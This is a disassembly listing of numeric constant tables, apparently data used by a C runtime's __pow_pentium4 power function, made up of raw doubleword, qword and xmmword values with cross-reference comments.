		align 4
a@Q?_12		db '@Ôï?',0
		align 4
a@Q?_13		db '@Óï?',0
		align 4
aAQ?_0		db '€Òï?',0
		align 4
aAQ?_1		db '€Ñï?',0
		align 4
aAQ?_2		db '€Ðï?',0
		align 4
aAQ?_3		db '€Ïï?',0
		align 4
aAQ?_4		db '€Îï?',0
		align 4
aAQ?_5		db '€Íï?',0
		align 4
aAQ?_6		db '€Ìï?',0
		align 4
aAQ?_7		db '€Ëï?',0
		align 4
aAQ?_8		db '€Êï?',0
		align 4
aAQ?_9		db '€Éï?',0
		align 4
aAQ?_10		db '€Èï?',0
		align 4
aAQ?_11		db '€Çï?',0
		align 4
aAQ?_12		db '€Æï?',0
		align 4
aAQ?_13		db '€Åï?',0
		align 4
aAQ?_14		db '€Äï?',0
		align 4
aAQ?_15		db '€Ãï?',0
		align 4
aAQ?_16		db '€Âï?',0
		align 4
aAQ?_17		db '€Áï?',0
		align 4
		dd 3FF01000h, 0
		dd 3FF00FC0h, 0
		dd 3FF00F80h, 0
		dd 3FF00F40h, 0
		dd 3FF00F00h, 0
		dd 3FF00EC0h, 0
		dd 3FF00E80h, 0
		dd 3FF00E40h, 0
		dd 3FF00E00h, 0
		dd 3FF00DC0h, 0
		dd 3FF00D80h, 0
		dd 3FF00D40h, 0
		dd 3FF00D00h, 0
		dd 3FF00CC0h, 0
		dd 3FF00C80h, 0
		dd 3FF00C40h, 0
		dd 3FF00C00h, 0
		dd 3FF00BC0h, 0
		dd 3FF00B80h, 0
		dd 3FF00B40h, 0
		dd 3FF00B00h, 0
		dd 3FF00AC0h, 0
		dd 3FF00A80h, 0
		dd 3FF00A40h, 0
		dd 3FF00A00h, 0
		dd 3FF009C0h, 0
		dd 3FF00980h, 0
		dd 3FF00940h, 0
		dd 3FF00900h, 0
		dd 3FF008C0h, 0
		dd 3FF00880h, 0
		dd 3FF00840h, 0
		dd 3FF00800h, 0
		dd 3FF007C0h, 0
		dd 3FF00780h, 0
		dd 3FF00740h, 0
		dd 3FF00700h, 0
		dd 3FF006C0h, 0
		dd 3FF00680h, 0
		dd 3FF00640h, 0
		dd 3FF00600h, 0
		dd 3FF005C0h, 0
		dd 3FF00580h, 0
		dd 3FF00540h, 0
		dd 3FF00500h, 0
		dd 3FF004C0h, 0
		dd 3FF00480h, 0
		dd 3FF00440h, 0
		dd 3FF00400h, 0
		dd 3FF003C0h, 0
		dd 3FF00380h, 0
		dd 3FF00340h, 0
		dd 3FF00300h, 0
		dd 3FF002C0h, 0
		dd 3FF00280h, 0
		dd 3FF00240h, 0
		dd 3FF00200h, 0
		dd 3FF001C0h, 0
		dd 3FF00180h, 0
		dd 3FF00140h, 0
		dd 3FF00100h, 0
		dd 3FF000C0h, 0
		dd 3FF00080h, 0
		dd 3FF00040h, 0
		dd 3FF00000h, 2	dup(0)
xmmword_426B30	xmmword	0		; DATA XREF: __pow_pentium4+CDr
		dd 7C800000h, 3F215029h, 0F6306155h, 3D210909h,	0E0000000h
		dd 3F34332Bh, 0E032F41Dh, 3D09518Ch, 60C00000h,	3F3FBE9Fh
		dd 570C3B37h, 3D4AC9BCh, 0A3600000h, 3F45A537h,	6127AF86h
		dd 3D432500h, 0CBC00000h, 3F4B6B4Dh, 0BC9E2AD6h, 3D3C621Fh
		dd 16300000h, 3F5098C9h, 2CAD082Ah, 3D3F7AECh, 64100000h
		dd 3F537C02h, 54A94BBEh, 3D4BDF27h, 0D1000000h,	3F565F52h
		dd 976214ECh, 3D46F089h, 5E700000h, 3F5942BAh, 0FEFAD48Ah
		dd 3D2645F4h, 0DC00000h, 3F5C2639h, 87DFF47Fh, 3D394ECBh
		dd 0E0700000h, 3F5F09CEh, 6245ADDFh, 3D415D32h,	0EBF80000h
		dd 3F60F6BDh, 0D5B7121Ch, 3D492366h, 0FAE00000h, 3F62689Fh
		dd 1790324Fh, 3D336048h, 9DA00000h, 3F63DA8Dh, 0B7973265h
		dd 3D31FE61h, 0D4F00000h, 3F654C86h, 0BF82BE32h, 3D4D5202h
		dd 0A1980000h, 3F66BE8Bh, 1A33F641h, 3D3A5F8Dh,	4400000h
		dd 3F68309Ch, 3283BC5Bh, 3D4F6569h, 0FDB00000h,	3F69A2B7h
		dd 72311CDEh, 3D4B05A0h, 8EA00000h, 3F6B14DFh, 84A38084h
		dd 3D2DA3CEh, 0B7C00000h, 3F6C8712h, 0CCF9E4BCh, 3D385B88h
		dd 79D00000h, 3F6DF951h, 7C1EB13Eh, 3D413857h, 0D5880000h
		dd 3F6F6B9Bh, 71123EC2h, 3D4EB2DDh, 0E5D40000h,	3F706EF8h
		dd 6D01207Ah, 3D4D0D7Bh, 0AE740000h, 3F712829h,	0F52C6D10h
		dd 3D44FE53h, 45000000h, 3F71E160h, 657D9491h, 3D3F031Fh
		dd 0A9D40000h, 3F729A9Ch, 3A7E7DA0h, 3D45D966h,	0DD500000h
		dd 3F7353DEh, 0D5DFD1BFh, 3D418E26h, 0DFD00000h, 3F740D26h
		dd 9AF0262Ch, 3D38DC82h, 0B1B00000h, 3F74C674h,	0B4D165E5h
		dd 3D408E4Eh, 53500000h, 3F757FC8h, 6F3F705Eh, 3D309234h
		dd 0C5080000h, 3F763921h, 0E85711EEh, 3D4E3FA9h, 73C0000h
		dd 3F76F281h, 9023862Bh, 3D4D5947h, 1A480000h, 3F77ABE6h
		dd 80430771h, 3D40C389h, 0FE880000h, 3F786550h,	260B1230h
		dd 3D1F92DBh, 0B4580000h, 3F791EC1h, 0C4B502C5h, 3D150038h
		dd 3C140000h, 3F79D838h, 7B281721h, 3D48CD3Dh, 96200000h
		dd 3F7A91B4h, 472C64BAh, 3D42C11Fh, 0C2D40000h,	3F7B4B36h
		dd 0EAF29DD2h, 3D4D0945h, 0C2940000h, 3F7C04BEh, 8833BE77h
		dd 3D21E731h, 95B40000h, 3F7CBE4Ch, 105EF8BFh, 3D462D58h
		dd 3C980000h, 3F7D77E0h, 9E901C30h, 3D4F8521h, 0B7A00000h
		dd 3F7E3179h, 0AFC4227Ch, 3D3C51FBh, 7240000h, 3F7EEB19h
		dd 896BF3BAh, 3D400766h, 2B840000h, 3F7FA4BEh, 62BA179Ch
		dd 3D435583h, 92900000h, 3F802F34h, 5F4B8D2Ah, 3D2A3CCBh
		dd 9A3C0000h, 3F8074D6h, 8DCC06D5h, 3D490B78h, 320E0000h
		dd 3F80D1B1h, 56CF5977h, 3D2B4125h, 0B4FC0000h,	3F812E8Eh
		dd 732B1F78h, 3D45C237h, 23380000h, 3F818B6Fh, 0EFD365C1h
		dd 3D45669Dh, 7CF00000h, 3F81E852h, 0DE73054Bh,	3D4589B8h
		dd 0C2540000h, 3F824538h, 14103D9Ch, 3D28FAB9h,	0F3900000h
		dd 3F82A221h, 829F58Ah,	3D47DF97h, 10D60000h, 3F82FF0Eh
		dd 0D80E4623h, 3D4B0D87h, 1A560000h, 3F835BFDh,	0D497E17Fh
		dd 3CF61343h, 103A0000h, 3F83B8EFh, 0EF56F96Bh,	3D49F7F4h
		dd 0F2B60000h, 3F8415E3h, 0F817F2FAh, 3D4859D5h, 0C1F80000h
		dd 3F8472DBh, 0E7BF7114h, 3D3B2734h, 7E2E0000h,	3F84CFD6h
		dd 3D1EEBA1h, 3D375390h, 27880000h, 3F852CD4h, 0A8F8BA37h
		dd 3D23A058h, 0BE340000h, 3F8589D4h, 6BDCCA43h,	3D37C2ECh
		dd 42620000h, 3F85E6D8h, 45ACF2C4h, 3D43701Dh, 0B4420000h
		dd 3F8643DEh, 7832AB27h, 3D3D6B19h, 14020000h, 3F86A0E8h
		dd 5557B8CCh, 3D411A9Bh, 6D780000h, 0BF7709C4h,	56CDE924h
		dd 0BD4563BAh, 91CC0000h, 0BF76ADCAh, 5BC6B74Bh, 0BD37A1A0h
		dd 479C0000h, 0BF7651CFh, 6C8B2465h, 0BD461BFAh, 8EE00000h
		dd 0BF75F5D2h, 0D49E79D0h, 0BD48FC8Fh, 678C0000h, 0BF7599D4h
		dd 0C7B88C7Ch, 0BD4925A3h, 0D1940000h, 0BF753DD4h, 33FB2BEh
		dd 0BD4B4606h, 0CCF00000h, 0BF74E1D3h, 71A52753h, 0BD202109h
		dd 598C0000h, 0BF7485D1h, 7C384C12h, 0BD4812A0h, 77640000h
		dd 0BF7429CDh, 9B769BAAh, 0BD4C0723h, 266C0000h, 0BF73CDC8h
		dd 3EA90181h, 0BD44838Ah, 66980000h, 0BF7371C1h, 0C7F77E67h
		dd 0BD288537h, 37D80000h, 0BF7315B9h, 536968Ch,	0BD4575A3h
		dd 9A280000h, 0BF72B9AFh, 1E2E7675h, 0BD2C45E1h, 8D740000h
		dd 0BF725DA4h, 0C38B4CE6h, 0BD4F8176h, 11BC0000h, 0BF720198h
		dd 0D79AC8A3h, 0BD1A700Bh, 26E80000h, 0BF71A58Ah, 22850043h
		dd 0BD46FB35h, 0CCF40000h, 0BF71497Ah, 0DDD3E76Fh, 0BD4F08E7h
		dd 3D40000h, 0BF70ED6Ah, 0FB0FA804h, 0BD4FF2A8h, 0CB7C0000h
		dd 0BF709157h, 0AEC80D04h, 0BD4E2FC0h, 23E00000h, 0BF703544h
		dd 0CFABFF4Fh, 0BD4E332Fh, 19F00000h, 0BF6FB25Eh, 490C8214h
		dd 0BD21AEBEh, 0D600000h, 0BF6EFA31h, 44A21404h, 0BD4543B1h
		dd 22080000h, 0BF6E4201h, 0A197589h, 0BD45215Eh, 57D00000h
		dd 0BF6D89CEh, 2DBEF9DDh, 0BD30CD2Dh, 0AE980000h, 0BF6CD198h
		dd 0EBB44E84h, 0BD4370F2h, 26500000h, 0BF6C1960h, 1180F792h
		dd 0BD4A99C2h, 0BEE80000h, 0BF6B6124h, 0A788B3A9h, 0BD11B04Eh
		dd 78380000h, 0BF6AA8E6h, 40E5BB2h, 0BD3D2D0Dh,	52380000h
		dd 0BF69F0A5h, 7EAE8A79h, 0BD201EAAh, 4CC80000h, 0BF693861h
		dd 0ACD98F5Bh, 0BD2B467Ah, 67D00000h, 0BF68801Ah, 0D3F33C6Bh
		dd 0BD4B3840h, 0A3480000h, 0BF67C7D0h, 0DA83377Dh, 0BD25EC92h
		dd 0FF080000h, 0BF670F83h, 31D4676Dh, 0BD33AB26h, 7B000000h
		dd 0BF665734h, 49B69DFEh, 0BD38FD13h, 17180000h, 0BF659EE2h
		dd 0A44FB97Dh, 0BD41A8BAh, 0D3380000h, 0BF64E68Ch, 0BC5C5FF3h
		dd 0BD4D828Ch, 0AF500000h, 0BF642E34h, 0A8B3C316h, 0BD44361Ah
		dd 0AB400000h, 0BF6375D9h, 0F704DE99h, 0BD49E932h, 0C6F80000h
		dd 0BF62BD7Bh, 0C254B5E3h, 0BD42BD57h, 2600000h, 0BF62051Bh
		dd 72942EE0h, 0BD167DF3h, 5D580000h, 0BF614CB7h, 0C54D36CDh
		dd 0BD3C729Eh, 0D7D00000h, 0BF609450h, 0C63BCDF1h, 0BD490EA5h
		dd 0E3700000h, 0BF5FB7CEh, 0EA0E76A9h, 0BD2D803Ch, 55D00000h
		dd 0BF5E46F6h, 96B4F4D5h, 0BD4D398Bh, 6B00000h,	0BF5CD618h
		dd 0A3058BBDh, 0BD4EA2CCh, 0F5E00000h, 0BF5B6533h, 0A7BBDD88h
		dd 0BD3F3E6Bh, 23200000h, 0BF59F44Ah, 5082614h,	0BD442DDCh
		dd 8E500000h, 0BF58835Ah, 34D8FE6Dh, 0BD404985h, 37400000h
		dd 0BF571265h, 0FD4FCA1Ch, 0BD2FA2A0h, 1DB00000h, 0BF55A16Ah
		dd 9949B49Bh, 0BD4EFD6Ch, 41900000h, 0BF543069h, 0B715781h
		dd 0BD4975AAh, 0A2A00000h, 0BF52BF62h, 6D7C16E7h, 0BD4B3AE8h
		dd 40C00000h, 0BF514E56h, 0C2477C3Fh, 0BD3064BEh, 37600000h
		dd 0BF4FBA88h, 34CEB438h, 0BD20F3D8h, 66800000h, 0BF4CD858h
		dd 0D88C7AA2h, 0BD433742h, 0EA00000h, 0BF49F61Dh, 25223470h
		dd 0BD48F98Bh, 2F600000h, 0BF4713D6h, 0AF53AD3h, 0BD4957C3h
		dd 0C8600000h, 0BF443183h, 1305B92Fh, 0BD48218Dh, 0D9400000h
		dd 0BF414F25h, 0F241B9B9h, 0BD492239h, 0C3800000h, 0BF3CD978h
		dd 36EA2A75h, 0BCD06422h, 0C2800000h, 0BF37148Eh, 47087803h
		dd 0BD40DFE4h, 0AF400000h, 0BF314F8Dh, 284F9CB2h, 0BD3E3BCFh
		dd 11800000h, 0BF2714EBh, 0DD523885h, 0BD4E94D8h, 3B000000h
		dd 0BF171519h, 328B2AFEh, 0BD17D35Dh, 4	dup(0)
qword_427340	dq 3FF7154740000000h	; DATA XREF: __pow_pentium4+115r
					; __pow_pentium4+11Er
		dd 0C0000000h, 3FF71545h, 40000000h, 3FF71544h,	0
		dd 3FF71543h, 80000000h, 3FF71541h, 0
		dd 3FF71540h, 80000000h, 3FF7153Eh, 40000000h, 3FF7153Dh
		dd 0C0000000h, 3FF7153Bh, 40000000h, 3FF7153Ah,	0C0000000h
		dd 3FF71538h, 80000000h, 3FF71537h, 0
		dd 3FF71536h, 80000000h, 3FF71534h, 0
		dd 3FF71533h, 80000000h, 3FF71531h, 40000000h, 3FF71530h
		dd 0C0000000h, 3FF7152Eh, 40000000h, 3FF7152Dh,	0C0000000h
		dd 3FF7152Bh, 80000000h, 3FF7152Ah, 0
		dd 3FF71529h, 80000000h, 3FF71527h, 0
		dd 3FF71526h, 0C0000000h, 3FF71524h, 40000000h,	3FF71523h
		dd 0C0000000h, 3FF71521h, 40000000h, 3FF71520h,	0C0000000h
		dd 3FF7151Eh, 80000000h, 3FF7151Dh, 0
		dd 3FF7151Ch, 80000000h, 3FF7151Ah, 0
		dd 3FF71519h, 0C0000000h, 3FF71517h, 40000000h,	3FF71516h
		dd 0C0000000h, 3FF71514h, 40000000h, 3FF71513h,	0C0000000h
		dd 3FF71511h, 80000000h, 3FF71510h, 0
		dd 3FF7150Fh, 80000000h, 3FF7150Dh, 0
		dd 3FF7150Ch, 0C0000000h, 3FF7150Ah, 40000000h,	3FF71509h
		dd 0C0000000h, 3FF71507h, 40000000h, 3FF71506h,	0
		dd 3FF71505h, 80000000h, 3FF71503h, 0
		dd 3FF71502h, 80000000h, 3FF71500h, 0
		dd 3FF714FFh, 0C0000000h, 3FF714FDh, 40000000h,	3FF714FCh
		dd 0C0000000h, 3FF714FAh, 40000000h, 3FF714F9h,	0
		dd 3FF714F8h, 80000000h, 3FF714F6h, 0
		dd 3FF714F5h, 80000000h, 3FF714F3h, 40000000h, 3FF714F2h
		dd 0C0000000h, 3FF714F0h, 40000000h, 3FF714EFh,	0C0000000h
		dd 3FF714EDh, 40000000h, 3FF714ECh, 0
		dd 3FF714EBh, 80000000h, 3FF714E9h, 0
		dd 3FF714E8h, 80000000h, 3FF714E6h, 40000000h, 3FF714E5h
		dd 0C0000000h, 3FF714E3h, 40000000h, 3FF714E2h,	0C0000000h
		dd 3FF714E0h, 80000000h, 3FF714DFh, 0
		dd 3FF714DEh, 80000000h, 3FF714DCh, 0
		dd 3FF714DBh, 80000000h, 3FF714D9h, 40000000h, 3FF714D8h
		dd 0C0000000h, 3FF714D6h, 40000000h, 3FF714D5h,	0C0000000h
		dd 3FF714D3h, 80000000h, 3FF714D2h, 0
		dd 3FF714D1h, 80000000h, 3FF714CFh, 0
		dd 3FF714CEh, 0C0000000h, 3FF714CCh, 40000000h,	3FF714CBh
		dd 0C0000000h, 3FF714C9h, 40000000h, 3FF714C8h,	0C0000000h
		dd 3FF714C6h, 80000000h, 3FF714C5h, 0
		dd 3FF714C4h, 80000000h, 3FF714C2h, 0
		dd 3FF714C1h, 0C0000000h, 3FF714BFh, 40000000h,	3FF714BEh
		dd 0C0000000h, 3FF714BCh, 40000000h, 3FF714BBh,	0
		dd 3FF714BAh, 80000000h, 3FF714B8h, 0
		dd 3FF714B7h, 80000000h, 3FF714B5h, 0
		dd 3FF714B4h, 0C0000000h, 3FF714B2h, 40000000h,	3FF714B1h
		dd 0C0000000h, 3FF714AFh, 40000000h, 3FF714AEh,	0
		dd 3FF714ADh, 80000000h, 3FF714ABh, 0
		dd 3FF714AAh, 80000000h, 3FF714A8h, 40000000h, 3FF714A7h
		dd 0C0000000h, 3FF714A5h, 40000000h, 3FF714A4h,	0C0000000h
		dd 3FF714A2h, 40000000h, 3FF714A1h, 0
		dd 3FF714A0h, 80000000h, 3FF7149Eh, 0
		dd 3FF7149Dh, 80000000h, 3FF7149Bh, 40000000h, 3FF7149Ah
		dd 0C0000000h, 3FF71498h, 40000000h, 3FF71497h,	0C0000000h
		dd 3FF71495h, 80000000h, 3FF71494h, 0
		dd 3FF71493h, 80000000h, 3FF71491h, 0
		dd 3FF71490h, 80000000h, 3FF715A3h, 0C0000000h,	3FF715A2h
		dd 40000000h, 3FF715A2h, 80000000h, 3FF715A1h, 0C0000000h
		dd 3FF715A0h, 0
		dd 3FF715A0h, 40000000h, 3FF7159Fh, 80000000h, 3FF7159Eh
		dd 0C0000000h, 3FF7159Dh, 0
		dd 3FF7159Dh, 40000000h, 3FF7159Ch, 0C0000000h,	3FF7159Bh
		dd 0
		dd 3FF7159Bh, 40000000h, 3FF7159Ah, 80000000h, 3FF71599h
		dd 0C0000000h, 3FF71598h, 0
		dd 3FF71598h, 40000000h, 3FF71597h, 80000000h, 3FF71596h
		dd 0
		dd 3FF71596h, 40000000h, 3FF71595h, 80000000h, 3FF71594h
		dd 0C0000000h, 3FF71593h, 0
		dd 3FF71593h, 40000000h, 3FF71592h, 80000000h, 3FF71591h
		dd 0C0000000h, 3FF71590h, 0
		dd 3FF71590h, 80000000h, 3FF7158Fh, 0C0000000h,	3FF7158Eh
		dd 0
		dd 3FF7158Eh, 40000000h, 3FF7158Dh, 80000000h, 3FF7158Ch
		dd 0C0000000h, 3FF7158Bh, 0
		dd 3FF7158Bh, 40000000h, 3FF7158Ah, 80000000h, 3FF71589h
		dd 0
		dd 3FF71589h, 40000000h, 3FF71588h, 80000000h, 3FF71587h
		dd 0C0000000h, 3FF71586h, 0
		dd 3FF71586h, 40000000h, 3FF71585h, 80000000h, 3FF71584h
		dd 0C0000000h, 3FF71583h, 0
		dd 3FF71583h, 80000000h, 3FF71582h, 0C0000000h,	3FF71581h
		dd 0
		dd 3FF71581h, 40000000h, 3FF71580h, 80000000h, 3FF7157Fh
		dd 0C0000000h, 3FF7157Eh, 0
		dd 3FF7157Eh, 40000000h, 3FF7157Dh, 0C0000000h,	3FF7157Ch
		dd 0
		dd 3FF7157Ch, 40000000h, 3FF7157Bh, 80000000h, 3FF7157Ah
		dd 0C0000000h, 3FF71579h, 0
		dd 3FF71579h, 40000000h, 3FF71578h, 80000000h, 3FF71577h
		dd 0C0000000h, 3FF71576h, 40000000h, 3FF71576h,	80000000h
		dd 3FF71575h, 0C0000000h, 3FF71574h, 0
		dd 3FF71574h, 40000000h, 3FF71573h, 80000000h, 3FF71572h
		dd 0C0000000h, 3FF71571h, 0
		dd 3FF71571h, 40000000h, 3FF71570h, 0C0000000h,	3FF7156Fh
		dd 0
		dd 3FF7156Fh, 40000000h, 3FF7156Eh, 80000000h, 3FF7156Dh
		dd 0C0000000h, 3FF7156Ch, 0
		dd 3FF7156Ch, 40000000h, 3FF7156Bh, 80000000h, 3FF7156Ah
		dd 0
		dd 3FF7156Ah, 40000000h, 3FF71569h, 80000000h, 3FF71568h
		dd 0C0000000h, 3FF71567h, 0
		dd 3FF71567h, 40000000h, 3FF71566h, 80000000h, 3FF71565h
		dd 0C0000000h, 3FF71564h, 0
		dd 3FF71564h, 80000000h, 3FF71563h, 0C0000000h,	3FF71562h
		dd 0
		dd 3FF71562h, 40000000h, 3FF71561h, 80000000h, 3FF71560h
		dd 0C0000000h, 3FF7155Fh, 0
		dd 3FF7155Fh, 40000000h, 3FF7155Eh, 80000000h, 3FF7155Dh
		dd 0
		dd 3FF7155Dh, 40000000h, 3FF7155Ch, 80000000h, 3FF7155Bh
		dd 0C0000000h, 3FF7155Ah, 0
		dd 3FF7155Ah, 40000000h, 3FF71559h, 80000000h, 3FF71558h
		dd 0C0000000h, 3FF71557h, 0
		dd 3FF71557h, 80000000h, 3FF71556h, 0C0000000h,	3FF71555h
		dd 0
		dd 3FF71555h, 40000000h, 3FF71554h, 80000000h, 3FF71553h
		dd 0C0000000h, 3FF71552h, 0
		dd 3FF71552h, 40000000h, 3FF71551h, 0C0000000h,	3FF71550h
		dd 0
		dd 3FF71550h, 40000000h, 3FF7154Fh, 80000000h, 3FF7154Eh
		dd 0C0000000h, 3FF7154Dh, 0
		dd 3FF7154Dh, 40000000h, 3FF7154Ch, 80000000h, 3FF7154Bh
		dd 0C0000000h, 3FF7154Ah, 40000000h, 3FF7154Ah,	80000000h
		dd 3FF71549h, 0C0000000h, 3FF71548h, 0
		dd 3FF71548h, 40000000h, 3FF71547h, 2 dup(0)
xmmword_427B50	xmmword	0		; DATA XREF: __pow_pentium4+127r
		dd 0C0000000h, 3EB80000h, 9BE959h, 3D4722F0h, 0A0000000h
		dd 3EC80001h, 6CB6DC2Eh, 3D45E657h, 0A0000000h,	3ED10001h
		dd 0A98BDB6Ah, 3D480762h, 0
		dd 3ED70003h, 495EC799h, 3D231A4Ch, 0B0000000h,	3EDD0004h
		dd 6928CDA3h, 3D492684h, 68000000h, 3EE18003h, 9FDDE667h
		dd 3D452750h, 70000000h, 3EE40004h, 292AE6DAh, 3D44FBD1h
		dd 0D8000000h, 3EE70005h, 0B226FD03h, 3D4EF91Ch, 78000000h
		dd 3EEA0007h, 9DC43B2Eh, 3D40978Ch, 48000000h, 3EED0009h
		dd 0BBE97951h, 3D33AE75h, 0F0000000h, 3EEF800Ah, 0A1639C05h
		dd 3D2D81B9h, 8C000000h, 3EF14006h, 0A1DD8452h,	3D3D3AA4h
		dd 0B8000000h, 3EF2C007h, 110BFB09h, 3D4D7BBEh,	0
		dd 3EF44009h, 9AB61086h, 3D43FBCBh, 60000000h, 3EF5C00Ah
		dd 0DFF79062h, 3D421D94h, 98000000h, 3EF7000Bh,	647408A2h
		dd 3D43B8E9h, 24000000h, 3EF8800Dh, 39E1FDD4h, 3D4FD8CEh
		dd 0CC000000h, 3EFA000Eh, 4E20BC42h, 3D439AB8h,	8C000000h
		dd 3EFB8010h, 269C6AC2h, 3D3DFD83h, 14000000h, 3EFCC012h
		dd 0CD8004E0h, 3D3CA32Eh, 0
		dd 3EFE4014h, 936C6005h, 3D47B472h, 8000000h, 3EFFC016h
		dd 0E8EF8E21h, 3D31736Ch, 14000000h, 3F00A00Ch,	0C138CCABh
		dd 3D0617CFh, 0FE000000h, 3F01400Ch, 0D620108Ah, 3D4E6D11h
		dd 26000000h, 3F02000Eh, 7455B88Dh, 3D245182h, 58000000h
		dd 3F02C00Fh, 8E426950h, 3D435E7Bh, 98000000h, 3F038010h
		dd 37D77647h, 3D3296F9h, 0E4000000h, 3F044011h,	0E16CAE71h
		dd 3D2B6DF6h, 2000000h,	3F04E013h, 6A2EA421h, 3D2FF937h
		dd 64000000h, 3F05A014h, 204C10D2h, 3D438EBDh, 0D4000000h
		dd 3F066015h, 0E2FC6DEBh, 3D2B09D7h, 50000000h,	3F072017h
		dd 641F4F35h, 3D099925h, 96000000h, 3F07C018h, 0F07288E3h
		dd 3CEDFBF4h, 28000000h, 3F08801Ah, 6748CA2Ah, 3D32A061h
		dd 0C6000000h, 3F09401Bh, 9CBA43ABh, 3D49CC1Eh,	72000000h
		dd 3F0A001Dh, 8173F5DBh, 3D41EBD3h, 2A000000h, 3F0AC01Fh
		dd 54471A92h, 3D41AF69h, 0A2000000h, 3F0B6020h,	0D59F4B89h
		dd 3D44A88Bh, 72000000h, 3F0C2022h, 0B27044E6h,	3D137160h
		dd 4C000000h, 3F0CE024h, 0C97EF2FCh, 3D47D7F6h,	34000000h
		dd 3F0DA026h, 0E1BB0DB2h, 3D44E605h, 0D4000000h, 3F0E4027h
		dd 17D4EBCFh, 3D459D84h, 0D4000000h, 3F0F0029h,	5F05027h
		dd 3CF5CA7Fh, 0DE000000h, 3F0FC02Bh, 0C234F566h, 3D4363B1h
		dd 0FB000000h, 3F104016h, 0D1035771h, 3D3B7B6Eh, 0DF000000h
		dd 3F109017h, 204367EFh, 3D38699Eh, 0F6000000h,	3F10F018h
		dd 0D9581118h, 3D44924Bh, 14000000h, 3F11501Ah,	0EB13B47h
		dd 3D2252E8h, 37000000h, 3F11B01Bh, 81CE38A0h, 3D4C3C33h
		dd 61000000h, 3F12101Ch, 4672A90Dh, 3D4B88D2h, 5E000000h
		dd 3F12601Dh, 55055FEFh, 3D4E1FC9h, 94000000h, 3F12C01Eh
		dd 547F3BC2h, 3D36E18Ah, 0D0000000h, 3F13201Fh,	0C6119AD4h
		dd 3CE9CBF2h, 11000000h, 3F138021h, 2A579871h, 3D4D0323h
		dd 22000000h, 3F13D022h, 0AB96AA1h, 3D4D5C82h, 70000000h
		dd 3F143023h, 5A37497Ch, 3D2FF623h, 0C3000000h,	3F149024h
		dd 0E61BB95Eh, 3D4A4461h, 1D000000h, 3F14F026h,	2C3EC2F0h
		dd 3D443127h, 42000000h, 3F154027h, 9E3A8113h, 3D424E2Bh
		dd 0A7000000h, 3F15A028h, 0AD7A3180h, 3D4A40BAh, 13000000h
		dd 3F16002Ah, 0F1B1988Bh, 3D33B2FEh, 85000000h,	3F16602Bh
		dd 34559377h, 3D01893Fh, 0FC000000h, 3F16C02Ch,	0FB3EF44h
		dd 3D4FFE12h, 3B000000h, 3F17102Eh, 0C162D124h,	3D120082h
		dd 0BE000000h, 3F17702Fh, 5B282967h, 3D3E587Ch,	48000000h
		dd 3F17D031h, 56673EACh, 3D1DF8F9h, 0D7000000h,	3F183032h
		dd 42DE4F13h, 3D4FF8CDh, 2A000000h, 3F188034h, 4915062h
		dd 3C83F841h, 0C5000000h, 3F18E035h, 65AD0E81h,	3D3484A7h
		dd 66000000h, 3F194037h, 827B5B7Ch, 3D4C2A7Eh, 0E000000h
		dd 3F19A039h, 0E619A5FEh, 3D45B9D9h, 74000000h,	3F19F03Ah
		dd 0E2D65D47h, 3D4389FDh, 27000000h, 3F1A503Ch,	0BB6D7BCCh
		dd 3D4B2175h, 0E1000000h, 3F1AB03Dh, 5C760A80h,	3D34C0CFh
		dd 0A1000000h, 3F1B103Fh, 0E6D3E9A5h, 3D046EDAh, 66000000h
		dd 3F1B7041h, 0AF377BFCh, 3D4FD521h, 0E6000000h, 3F1BC042h
		dd 0E6AB1BFDh, 3D0CF59Fh, 0B7000000h, 3F1C2044h, 0CC753DB5h
		dd 3D3CCD20h, 8F000000h, 3F1C8046h, 0A92669CCh,	3D152DF2h
		dd 6C000000h, 3F1CE048h, 0BE6FF5D7h, 3D4E8CFDh,	0FF000000h
		dd 3F1D3049h, 37245449h, 3D4E51B6h, 0E9000000h,	3F1D904Bh
		dd 0CDDA9DD0h, 3D30855Ch, 0D8000000h, 3F1DF04Dh, 97D07430h
		dd 3D49DC01h, 0CE000000h, 3F1E504Fh, 0BD27E20Ah, 3D431DC9h
		dd 75000000h, 3F1EA051h, 2534FEA4h, 3D40AE40h, 76000000h
		dd 3F1F0053h, 710AAD2Ah, 3D47FA77h, 7E000000h, 3F1F6055h
		dd 0E113204Bh, 3D2BBDB4h, 8B000000h, 3F1FC057h,	6E50D246h
		dd 3D4D8D3Bh, 0CF800000h, 3F20102Ch, 6A15DE9h, 3D4BD3FCh
		dd 0AF800000h, 3F20382Dh, 498EC6C9h, 3D4D93A1h,	0BF800000h
		dd 3F20682Eh, 0F935A7F0h, 3D33CB6Dh, 0D2000000h, 3F20982Fh
		dd 9920CFDAh, 3D4DE108h, 0E8000000h, 3F20C830h,	12A6B1ACh
		dd 3D4985B0h, 0D2000000h, 3F20F031h, 0B9BA2290h, 3D4913E1h
		dd 0EE000000h, 3F212032h, 7980EDBCh, 3D1624A5h,	0C800000h
		dd 3F215034h, 9125FF3h,	3D441EE7h, 2E800000h, 3F218035h
		dd 75F48B5Dh, 3D3A45E5h, 22800000h, 3F21A836h, 1E238A6Ch
		dd 3D3501DDh, 4A000000h, 3F21D837h, 1EA6AA2Ch, 3D4191BCh
		dd 75000000h, 3F220838h, 7921F7B0h, 3CE32323h, 0A2800000h
		dd 3F223839h, 0D0781FF4h, 3D46B179h, 0D3800000h, 3F22683Ah
		dd 0DA134362h, 3D44C09Dh, 0D4000000h, 3F22903Bh, 1DE50175h
		dd 3D4652E3h, 0B000000h, 3F22C03Dh, 0DCD68A32h,	3D137D77h
		dd 44800000h, 3F22F03Eh, 2840CC02h, 3D4636FBh, 81800000h
		dd 3F23203Fh, 979C27F4h, 3D41A8E1h, 8C000000h, 3F234840h
		dd 84163334h, 3D410DBFh, 0CE800000h, 3F237841h,	2A7D4E75h
		dd 3D4A8E04h, 14800000h, 3F23A843h, 3772BE29h, 3D377259h
		dd 5D800000h, 3F23D844h, 2E8C031Dh, 3D223D4Bh, 72000000h
		dd 3F240045h, 0CA9DAD06h, 3D0C8072h, 0C0800000h, 3F243046h
		dd 0EE313D33h, 3D315A83h, 12000000h, 3F246048h,	88B7C68h
		dd 3D473DC4h, 67000000h, 3F249049h, 0A9DCEAE1h,	3D3AF34Eh
		dd 0BF000000h, 3F24C04Ah, 0A0653485h, 3D36C20Bh, 0E0000000h
		dd 3F24E84Bh, 847BE3FFh, 3D39A63Ch, 3D800000h, 3F25184Dh
		dd 50A55975h, 3D48CA77h, 9E800000h, 3F25484Eh, 2D1381BBh
		dd 3D38DB2Ah, 2800000h,	3F257850h, 1FBE7983h, 3D2EF246h
		dd 2D800000h, 3F25A051h, 0C40C395Ch, 3D2C153Bh,	97000000h
